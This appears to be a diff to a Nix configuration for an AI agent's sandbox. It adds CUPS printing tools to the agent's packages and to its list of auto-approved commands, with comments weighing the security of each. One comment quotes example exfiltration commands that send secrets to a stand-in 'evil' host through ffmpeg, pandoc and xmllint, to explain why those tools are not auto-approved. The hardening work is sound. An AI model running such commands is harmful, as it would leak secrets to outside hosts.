@@ -131,6 +131,7 @@ in
   # network fetch or a writable site-library.
   extraPackages = with pkgs; [
     chromium # browser automation via CDP (OpenClaw browser tool)
+    cups # `lp`/`lpr`/`lpstat`/… CUPS client tools (submit/query/cancel print jobs)
     ffmpeg # full ffmpeg (STT already pulls ffmpeg-headless; this adds codecs)
     imagemagick # `convert`/`magick` image manipulation
     libxml2.bin # `xmllint` (lives in the .bin output, not the default one)
@@ -283,6 +284,13 @@ in
       # are denied), so `find . -type f` reads unprompted while
       # `find . -delete` / `-exec` still MISS and raise the approval prompt.
       "find"
+      # CUPS printing client tools. These talk to the LOCAL cups daemon over IPP
+      # to submit / query / cancel print jobs and read/set per-user options —
+      # NOT printer administration. `lpadmin`/`lpinfo` (add/remove printers,
+      # enumerate devices) need root and are DELIBERATELY absent, so a bare
+      # invocation of those still prompts. (`lp -h <remote>` could target another
+      # IPP server, but eva's default destination is the local daemon.)
+      "lp" "lpr" "lpstat" "lpq" "lprm" "cancel" "lpoptions"
       # ffmpeg/ffprobe/pandoc/xmllint are network-capable — `ffmpeg -i
       # http://evil/<secret>`, `pandoc https://evil/<secret>` (or its
       # --lua-filter RCE), `xmllint http://evil/<secret>` — so they are NOT
